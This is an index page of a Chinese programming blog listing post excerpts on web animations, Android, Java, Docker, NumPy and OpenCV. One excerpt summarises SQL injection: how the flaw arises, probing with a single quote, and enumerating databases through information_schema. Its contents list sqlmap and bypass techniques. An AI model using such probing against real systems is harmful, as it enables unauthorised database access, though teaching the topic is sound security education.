<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad13b96e98477e315013b706e28862fc/" rel="bookmark">
			html情侣表白代码，自动打字、动态爱心、图片旋转木马特效
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给男朋友准备的520礼物，他觉得太尴尬了，于是我特地把这个项目开源，让大家一起感受一下男票的尴尬，哈哈哈哈哈哈我好恶趣味。
话不多说上代码
html部分：
&lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;love++&lt;/title&gt; &lt;style&gt; html, body { width: 500px; height:300px; left:50px; top:30px; margin: 100px 289px; background: #f6d8e2; } pp1{ position: absolute; top: 20px; left: 20px; } canvas { position: absolute; width: 1000px; height: 500px; left:135px; top:50px; }&lt;/style&gt; &lt;link href="css/default.css" type="text/css" rel="stylesheet"&gt; &lt;script type="text/javascript" src="d.js"&gt;&lt;/script&gt; &lt;script language="javascript" type="text/javascript"&gt; // 18秒以后再跳转 setTimeout("javascript:location.href='./index.html'", 15000); &lt;/script&gt; &lt;/head&gt; &lt;div id="myContent"&gt;&lt;/div&gt; &lt;div id="contentToWrite" class="comments" style="display:none;"&gt;此为打字动画，可以编辑文本&lt;/div&gt; &lt;script type="text/javascript"&gt; writeContent(true); &lt;/script&gt; &lt;/body&gt; &lt;body&gt; &lt;canvas id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ad13b96e98477e315013b706e28862fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/adbc6daf89bab03e19a442fb8738bd60/" rel="bookmark">
			攻击树模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当今的计算机系统和网络安全风险日益增加，攻击者利用各种漏洞和技术来入侵系统，从而造成严重的损失。攻击树模型是一种针对计算机系统和网络的安全评估方法，它可以帮助安全专家评估系统的安全性，并识别潜在的攻击路径和威胁。
一、攻击树模型的概述
攻击树模型是一种图形化的安全评估工具，它用于评估系统和网络的安全性，并确定防御和应对潜在攻击的策略。攻击树模型基于树形结构，攻击者的目标在根节点，攻击者需要遵循不同的攻击路径到达目标节点。攻击树模型的节点包括基本事件、中间事件和最终事件，每个节点都表示系统中的一个潜在漏洞或安全问题。
二、攻击树模型的构建
攻击树模型的构建分为三个主要步骤：
确定攻击目标：首先，需要确定攻击者的目标。攻击目标通常是重要的系统或数据，例如金融数据、客户数据等。
构建攻击树：根据攻击目标，构建攻击树。攻击树的根节点是攻击者的目标，每个节点代表一个可能的攻击路径，可以通过将基本事件、中间事件和最终事件组合在一起来构建攻击路径。基本事件是攻击树的最小单元，代表系统中的一个潜在漏洞或安全问题。中间事件是基本事件的组合，表示攻击者在攻击过程中需要经过的一系列步骤。最终事件是攻击成功的事件，表示攻击者在攻击树的某个节点上获得了他们的目标。
分析攻击树：最后，需要分析攻击树，确定潜在的攻击路径和威胁。可以使用攻击树模型来识别系统中的弱点，并制定相应的安全策略和措施来保护系统。
三、攻击树模型的优点和局限性
攻击树模型具有以下优点：
1、易于理解和应用：攻击树模型使用树形结构表示系统和网络的安全性，易于理解和应用。
2、可以识别潜在攻击路径和威胁：攻击树模型可以识别系统中的弱点和漏洞，帮助安全专家确定潜在的攻击路径和威胁。
3、可以制定相应的安全策略和措施：攻击树模型可以帮助安全专家制定相应的安全策略和措施来保护系统和网络。
虽然攻击树模型具有许多优点，但也存在一些局限性：
1、构建攻击树需要大量的时间和资源：构建攻击树需要安全专家花费大量的时间和资源，特别是在系统和网络规模较大的情况下。
2、需要持续更新：攻击树模型需要持续更新，以反映新的攻击方式和技术，否则就会失去它的有效性。
3、依赖于专业知识：攻击树模型需要安全专家具备专业的知识和技能，才能正确地构建和分析攻击树。
四、攻击树模型的应用
攻击树模型可以应用于许多不同的领域，包括：
1、系统和网络安全评估：攻击树模型可以用于系统和网络安全评估，以确定潜在的攻击路径和威胁，并制定相应的安全策略和措施来保护系统和网络。
2、安全漏洞管理：攻击树模型可以用于管理安全漏洞，并帮助安全团队分析漏洞的严重性和优先级。
3、安全培训和教育：攻击树模型可以用于安全培训和教育，以帮助员工和用户了解安全风险和如何防范安全威胁。
总之，攻击树模型是一种非常有用的工具，可以帮助安全专家评估系统和网络的安全性，并制定相应的安全策略和措施来保护系统。虽然攻击树模型存在一些局限性，但它仍然是一种广泛使用的安全评估工具，可以帮助组织和个人提高安全性并保护重要的数据和资产。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38d6efe41080a5655d531a89f9f46910/" rel="bookmark">
			Android MediaCodec dump MP4实践小结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.应用背景 在一些集成了算法SDK的Android APP中，这些APP是取出摄像头实时帧，然后调用视觉算法SDK并产生检测结果。而当测试人员发现某一场景下算法效果欠佳时，需要从摄像头实时原始数据帧dump一段视频（mp4格式），因此，这些Android APP中需要提供相应的功能，而Android MediaCodec则很方便为开发人员提供应用接口去实现Android视频方面的操作。
2.Android MediaCodec简介 1.MediaCodec含义：MediaCodec是Android中提供的音视频编码、解码工具。它主要是完成上层接口的封装，提供给开发者使用，编解码功能是在native底层服务中完成的。
2.工作流程
1）缓存队列：client需要将数据放入输入队列，等待MediaCodec处理后，从输出队列获取结果数据
输入队列，接受数据（格式ByteBuffer）；
输出队列，输出数据（格式ByteBuffer）；
（2）使用
a.把原始数据放入输入缓冲区队列中一个空缓冲区上；
b.编/解码器从输入缓冲队列中获取缓冲区上数据，进行编码处理，结果存放到输出缓冲区上一个空缓冲区上；
c.处理完毕后，释放该输入缓冲区，它会被重新放回输入缓冲区队列，以便下次重复使用。
3.相关API
createDecoderByType:获取解码器对象 createEncoderBytype:获取编码器对象 configure：对编解码器进行配置，使编解码器转入配置状态 start：使编码器转入执行刷新状态 stop：结束并返回到未初始化状态 release：释放实例资源 createInputSurface：创建输入缓冲Surface setOutputSurface：设置输出缓冲Surface getInputBuffers：获取需要编码数据的输入流队列，返回的是一个ByteBuffer数组 queueInputBuffer：输入流入队列 dequeueInputBuffer：从输入流队列中取数据进行编码操作 getOutputBuffers：获取编解码之后的数据输出流队列，返回的是一个ByteBuffer数组 dequeueOutputBuffer：从输出队列中取出编码操作之后的数据 releaseOutputBuffer：处理完成，释放ByteBuffer数据 3.Android MediaMuxer简介 1.含义：在Android中，可以使用MediaMuxer来封装编码后的视频流和音频流到mp4容器中,目前MediaMuxer支持的文件输出格式包括MP4，webm和3gp。
2.使用
（1）构造
MediaMuxer mMediaMuxer = new MediaMuxer(mOutputVideoPath, MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4); // new MediaMuxer(String path, int format)指定视频文件输出路径和文件格式 （2）添加媒体通道
//开始编码 就会调用一次 MediaFormat outputFormat = mMediaCodec.getOutputFormat(); //配置封装器 // 增加一路指定格式的媒体流 视频 index = mMediaMuxer.addTrack(outputFormat); （3）启动
MediaMuxer.start(); （4）写入数据
// 输出缓冲区 MediaCodec.BufferInfo bufferInfo = new MediaCodec.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/38d6efe41080a5655d531a89f9f46910/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4529948b3683db468922f5f8b4945ff8/" rel="bookmark">
			本地缓存-CacheLoader
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引入依赖
&lt;dependency&gt; &lt;groupId&gt;com.google.guava&lt;/groupId&gt; &lt;artifactId&gt;guava&lt;/artifactId&gt; &lt;version&gt;30.1.1-jre&lt;/version&gt; &lt;/dependency&gt; SpringBoot - InitializingBean的作用是什么？
InitializingBean的作用是Bean注入到Spring容器且初始化后，执行特定业务化的操作
如果采用实现InitializingBean接口的方式去执行特定业务化的操作，则需要重写afterPropertiesSet这仅有的一个方法。
@Slf4j @Data public class KieAccessor implements InitializingBean { public LoadingCache&lt;String, List&lt;String&gt;&gt; getCache() { return cache; } public void setCache(LoadingCache&lt;String, List&lt;String&gt;&gt; cache) { this.cache = cache; } private LoadingCache&lt;String, List&lt;String&gt;&gt; cache = null; @Override public void afterPropertiesSet() throws Exception { cache = CacheBuilder.newBuilder() //设置并发级别为8，并发级别是指可以同时写缓存的线程数 .concurrencyLevel(8) //设置缓存容器的初始容量为10 .initialCapacity(10) //设置缓存最大容量为100，超过100之后就会按照LRU最近虽少使用算法来移除缓存项 .maximumSize(100) //是否需要统计缓存情况,该操作消耗一定的性能,生产环境应该去除 // .recordStats() //设置写缓存后n秒钟过期 .expireAfterWrite(48, TimeUnit.HOURS) //设置读写缓存后n秒钟过期,实际很少用到,类似于expireAfterWrite //.expireAfterAccess(17, TimeUnit.SECONDS) //只阻塞当前数据加载线程，其他线程返回旧值 //.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4529948b3683db468922f5f8b4945ff8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/731b4dacaa65d17b8d2e12595392f444/" rel="bookmark">
			解决Execution failed for task ‘:app:installDebug‘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🌟当安装android应用时出现下面的错误：
Execution failed for task ‘:app:installDebug’.
java.util.concurrent.ExecutionException: com.android.builder.testing.api.DeviceException: com.android.ddmlib.InstallException: INSTALL_FAILED_UPDATE_INCOMPATIBLE: Package com.example.prebuiltcall signatures do not match previously installed version; ignoring!
Execution failed for task ':app:installDebug'. &gt; java.util.concurrent.ExecutionException: com.android.builder.testing.api.DeviceException: com.android.ddmlib.InstallException: INSTALL_FAILED_UPDATE_INCOMPATIBLE: Package com.example.prebuiltcall signatures do not match previously installed version; ignoring! 🌟问题原因：
错误消息表明应用程序的安装存在问题。具体而言，它表明应用程序已安装在设备上，其签名与您尝试安装的签名不同。如果您尝试安装与设备上当前安装的签名不同的新版本的应用程序，则可能会发生这种情况。
🌟要解决此问题，使用下面的步骤：
1.从设备上卸载现有版本的应用。您可以通过转到设备的设置，选择“应用”，在列表中找到该应用，然后选择“卸载”来执行此操作。
2.在Android Studio中清理和重建应用程序。为此，请点击“Build”&gt;“Clean Project”，然后转到“Build”&gt;“Rebuild Project”。
3.在设备上再次运行应用程序。这应该安装具有正确签名的新版本应用程序。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/974e06b078bf64df38434a0d58532820/" rel="bookmark">
			java设计模式-动态代理模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		动态代理模式 public interface IService{ } public class ServiceImpl impl IService { } 当一个类实现了ApplicationContextAware之后，这个类就可以方便获得ApplicationContext中的所有bean，
这个类可以直接获取spring配置文件中，所有有引用到的bean对象。
@Component public final class ApplicationUtil implements ApplicationContextAware { private static ApplicationContext applicationContext; @Override public void setApplicationContext(ApplicationContext contex) throws BeansException { this.applicationContext = contex; } public static ApplicationContext getApplicationContext() { return applicationContext; } } //@DependsOn。@DependsOn强调的是Bean与Bean之间的依赖关系。如：A @DependsOn B表示，只有当B初始化完成了才会去初始化A。这里所谓的Bean可以是任何Bean：包括@Bean、@Component、@Configuration等一切形式
@DependsOn("applicationUtil") @Slf4j @Component public class IDataStrategy { private static final Map&lt;String, IService&gt; HANDLER_MAP = new ConcurrentHashMap&lt;&gt;(); @PostConstruct public static void init() { Map&lt;String, IService&gt; beansOfType = ApplicationUtil.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/974e06b078bf64df38434a0d58532820/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df593fd7b5a807071d54d556b8a6312d/" rel="bookmark">
			让HR眼前一亮：30个APP项目软件测试经验，点燃你的简历
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在求职过程中，我们都希望自己的简历能够吸引面试官的眼球，从而获得更多的面试机会。作为一名软件测试人员，丰富的实战经验是让自己脱颖而出的关键之一。
在我多年从事APP项目软件测试的工作中，我积累了大量的实践经验，并成功将这些经验写入简历中，让自己在众多应聘者中脱颖而出，最终拿到了心仪的工作。
今天，我想和大家分享我的经验，提供30个可写在简历上的APP项目软件测试实战经验，让你的简历更具吸引力，让HR眼前一亮，轻松拿下理想工作！
目录：导读
app技能
案例：
项目一 民康门诊软件(app+web)
项目二 明正医疗云诊所(app+web)
项目三 爱维宝贝智慧幼儿园
项目四 智慧川传APP
项目五 悦直播(app)
项目六 星脉赎楼(App)
项目七 乐购app
项目八 何家亲app
项目九 寄递业App
项目十 云帮送
项目十一 晴眠
项目十二 网课APP
项目十三 健客医院(app端)
项目十四 易淘(app)
项目十五 BWH医疗挂号(app/web)
项目十六 买菜APP
项目十七 MCLOUD 移动办公APP
项目十八 万想商城（Amazingshop）购物平台
项目十九 惠家有商城（APP端）
项目二十 海选百货
项目二十一 兴盛优选app(功能+接⼝)
项目二十二 爱采购app(功能+接⼝)
项目二十三 萌宠社
项目二十四 高光app
项目二十五 纸条APP
项目二十六 聚爱优选app
项目二十七 居民服务网(app)
项目二十八 小说巴士(app)
项目二十九：去玩(App端)项目描述：
项目三十 华智OA
首先给大家先简单讲讲如何写好你的APP技能，这下面是我总结出来比较合适的技能点，你们可以参考一下
app技能 1、通过ADB命令抓取日志，对测试中遇到的问题做初步分析，作为提单的附件；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df593fd7b5a807071d54d556b8a6312d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/baedb53e845ae71f13945fcc00572ae9/" rel="bookmark">
			docker-compose
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
Docker-compose 简介
compose部署
环境安装
YAML 文件格式及编写注意事项
数据结构
Docker Compose配置常用字段
Docker Compose常用命令
Docker Compose文件结构
Docker-compose 简介 Docker-Compose项目是Docker官方的开源项目，负责实现对Docker容器集群的快速编排。
Docker-Compose的工程配置文件默认为docker-compose.yml，可通过环境变量COMPOSE_FILE或-f参数自定义配置文件，其定义了多个有依赖关系的服务及每个服务运行的容器。
compose部署 环境安装 #下载 curl -L https://github.com/docker/compose/releases/download/1.21.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose #安装 chmod +x /usr/local/bin/docker-compose #查看版本 docker-compose --version YAML 文件格式及编写注意事项 YAML 是一种标记语言，它可以很直观的展示数据序列化格式，可读性高。YAML 数据结构通过缩进来表示，连续的项目通过减号来表示，键值对用冒号分隔，数组用中括号 [] 括起来， hash 用花括号 {} 括起来。
使用 YAML 时需要注意下面事项：
●大小写敏感 ●通过缩进表示层级关系 ●不支持制表符 tab 键缩进，只能使用空格缩进 ●缩进的空格数目不重要，只要相同层级左对齐，通常开头缩进2个空格 ●用 # 号注释 ●符号字符后缩进1个空格，如冒号 : 、逗号 , 、横杠 - ●如果包含特殊字符用单引号('')引起来会作为普通字符串处理，双引号(""): 特殊字符作为本身想表示的意思 name: "Hi,\nTom" 数据结构 ①对象映射: 键值对的字典
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/baedb53e845ae71f13945fcc00572ae9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4811cc191b09890871c261959d8b47a8/" rel="bookmark">
			笔记，解决token在本地的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be34f8b72304d5f64403ddb7c817b5d1/" rel="bookmark">
			头歌数据结构 第1关：顺序表的实现之查找功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		/************************************************************* 顺序表的实现之查找功能 实现文件 更新于2020年4月13日 **************************************************************/ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include "Seqlist.h" void SL_Initiate(SqList &amp;L) // 顺序表的初始化，即构造一个空的顺序表 { L.elem = (ElemType*)malloc(sizeof(ElemType)*MAXSIZE); L.length=0; } void SL_Free(SqList &amp;L) // 释放顺序表 { free(L.elem); } bool SL_IsEmpty(SqList L) // 判断顺序表是否空 { return L.length==0; } bool SL_IsFull(SqList L) // 判断顺序表是否满 { return L.length==MAXSIZE; } void SL_Create(SqList &amp;L,int n) // 输入n个数据元素，创建一个顺序表L { int i; L.length=n; for(i=0; i&lt;n; i++) scanf("%d", &amp;L.elem[i]);	} void SL_Print(SqList L) // 输出整个顺序表 { if (L.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/be34f8b72304d5f64403ddb7c817b5d1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/211961cd268e92feead62068dd3d36a1/" rel="bookmark">
			SQL注入总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 SQL注入原理1、理解SQL注入2、SQL注入的产生过程及常见原因 MYSQL注入思路SQL注入基础知识1、关于information_schema**2、关于字符型、数值型的判断3、关于跨库攻击4、关于文件读写函数5、关于魔术引号6、关于盲注与报错注入7、关于二次注入8、关于宽字节注入（%df') DVWA 普通手工SQL注入DVWA sqlmap工具实现SQL注入DVWA 盲注DVWA 报错注入SQL注入绕过SQL注入防护 SQL注入原理 1、理解SQL注入 SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。由于sql语句本身的多样性，以及可用于构造sql语句的编程方法很多，因此凡是构造sql语句的步骤均存在被攻击的潜在风险。Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。 如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。当使用sql服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。 2、SQL注入的产生过程及常见原因 1.产生过程 大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。 2.常见的sql注入产生原因 2.1.不当的处理类型 Sql数据库将单引号字符（’）解析成代码与数据间的分界线：单引号外面的内容军事需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 2.2.不安全的数据库配置 数据库带有很多默认的用户预安装内容。SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，知识比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。 这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。 2.3.不合理的查询集处理 有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。 2.4.不当的错误处理 错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 2.5.多个提交处理不当 大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。 应用打开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。 例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。 MYSQL注入思路 SQL注入基础知识 1、关于information_schema** 1.information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。 2.information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。 1.SCHEMATA 表：当前 mysql 实例中所有数据库的信息。SHOW DATABASES; 命令从这个表获取数据 mysql&gt; use information_schema; mysql&gt; select SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA; +--------------------+----------------------------+ | SCHEMA_NAME | DEFAULT_CHARACTER_SET_NAME | +--------------------+----------------------------+ | information_schema | utf8 | | challenges | gbk | | mysql | latin1 | | performance_schema | utf8 | | security | gbk | +--------------------+----------------------------+ 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/211961cd268e92feead62068dd3d36a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d74dc195feb79026572cf6be3d02dcf/" rel="bookmark">
			机器学习和深度学习的基本数据结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ndarray Numpy提供了高效存储和操作密集数据的接口，Numpy的ndarray数组几乎是整个数据科学的中心。Numpy的ndarray能提供这种强大功能的原因是ndarray把相同类型的数据储存在同一片内存空间中，从而减少了类似python动态类型列表的不必要内存支出。
创建数组 不同于python的列表，Numpy数组必须是为同一类型的数据，如果类型不匹配会自动向上转换，可以用dtype明确设置数据类型。
首先到导入numpy包，然后命名为np。
import numpy as np 用python列表创建数组，再用关键字dtype（可以传入python内置数据类型、Numpy数据类型字符串，或者通过np.dtype传入）转换数据类型。
np.array([1,2,3,4],dtype=np.float32) #输出array([1., 2., 3., 4.], dtype=float32) 一种更高效的方法是通过Numpy的内置函数创建数组：
创建随机数 使用Numpy包中的random函数
#创建0~1均匀分布的3*3随机数组 np.random.random((3,3)) #创建一个均值为0，方差为1的正态分布数组 #第一个位置参数为均值，第二个位置参数为方差，第三个位置参数为数组维度 np.random.normal(0,1,(3,3)) #创建一个0~10之间的3*3随机整数 np.random.randint(0,10,(3,3)) #创建一个0~1均匀分布的数组 np.random.rand(3,2) #创建一个指定大小的标准正态分布数组 np.random.randn(3,3) 创建指定类型的数组 #创建单位阵 np.eye(3) #创建一个未初始化数组，数字为内存地址中的随机数 np.empty(3) #创建一个全0矩阵 np.zeros(3,4) #创建一个全1矩阵 np.ones((3,3)) #创建一个元素为指定大小的数组 np.full((3,3),3.1415) #创建一个指定区间均匀分配是数组 np.linspace(0,20,10) 数据类型和数组属性 数据类型 当创建数组是可以用字符串参数指定数据类型，如：
np.zeros(3,dtype="int16") 或者Numpy对象指定：
np.zeros(3,dtype=np.int16) Numpy的基本数据类型有：
int8、int16、int32、int64、float16、float32、float64、complex64、complex128等……
数组属性 ndarray数组的属性有ndim（数组的维度）、shape（每个维度大小）、size（数组的总大小）、dtype（数组的数据类型）
x = np.random.randn(3,4,5) print("x.ndim: ",x.ndim) print("x.shape: ",x.shape) print("x.size: ",x.size) print("x.dtype: ",x.dtype) 输出为：
x.ndim: 3
x.shape: (3, 4, 5)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d74dc195feb79026572cf6be3d02dcf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/297eed4a5bb7a167560347403e8ae882/" rel="bookmark">
			docker的三种镜像创建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
dock的三种镜像创建
基于现有的镜像创建
基于本地模板创建
基于Dockerfile 创建
联合文件系统
镜像加载原理
为什么Docker里的centos的大小才200M？
Docker 镜像结构的分层
Dockerfile 操作常用的指令
Dockerfile格式
dockerfile构建apache实例
dockerfile构建nginx实例
dockerfile构建tomcat实例
dock的三种镜像创建 创建镜像有三种方法，分别为基于已有镜像创建、基于本地模板创建以及基于Dockerfile创建。
基于现有的镜像创建 首先创建一个镜像，在容器里做修改
docker create -it centos:7 /bin/bash
然后将修改后的容器提交为新的镜像，需要使用该容器的 ID 号创建新镜像
docker commit -m "new" -a "centos" bbd9376525ca centos:test
常用选项：
-m 说明信息；
-a 作者信息；
-p 生成过程中停止容器的运行。
基于本地模板创建 通过导入操作系统模板文件可以生成镜像，模板可以从 OPENVZ 开源项目下载，下载地址为http://openvz.org/Download/template/precreated
wget http://download.openvz.org/template/precreated/debian-7.0-x86-minimal.tar.gz
#导入为镜像
cat debian-7.0-x86-minimal.tar.gz | docker import - debian:test
基于Dockerfile 创建 联合文件系统 UnionFS(联合文件系统）：Union文件系统(UnionFS)是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下。AUFS、OverlayFS 及 Devicemapper 都是一种 UnionFS。
Union文件系统是Docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。
特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录。
下载的时候看到的一层层的就是联合文件系统。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/297eed4a5bb7a167560347403e8ae882/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3057009516c970866230d1096f417526/" rel="bookmark">
			【小白傻瓜式四步搞定vs2019下配置OpevCv环境】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
第一步：下载 并解压
第二步：配置环境变量
第三步：启动VS2019 创建 控制台应用 文件
第四步：配置VS2019环境
测试代码 测试是否安装成功
第一步：下载opencv 4.1.2
https://github.com/opencv/opencv/releases/tag/4.1.2
opencv-4.1.2-vc14_vc15.exe
解压
第二步：设置环境变量 win10系统
右键-&gt; 此电脑-&gt; 属性 出现以下画面 按图标点击
你自已解压的目录 下的 这个路径：
\opencv\build\bin 找到这个路径
![在这里插入图片描述](https://img-blog.csdnimg.cn/f1
c072de351440c5ba6425b4ae1281f3.png)
第三步：启动VS2019 创建 控制台应用 文件
第四步：配置VS2019环境
选中VC++目录 配置 1、包含目录 2、库目录
选中链接器的-&gt; 输入-&gt; 附加依赖项 -&gt; 复制库文件名字
保存再重新启动VS2019
写测试代码
之前代码删除，复制测试代码 运行效果如下：
#include #include &lt;opencv2/core/core.hpp&gt;
#include &lt;opencv2/highgui/highgui.hpp&gt;
#include &lt;opencv2/imgproc.hpp&gt;
using namespace std;
using namespace cv;
int main(void)
{
Mat image = Mat::zeros(300, 600, CV_8UC3);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3057009516c970866230d1096f417526/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/759c48f1be059ac4e55dfcbb9359e297/" rel="bookmark">
			索引失效了？看看这几个常见的原因
			</a>
		</h2>
		
	</header>
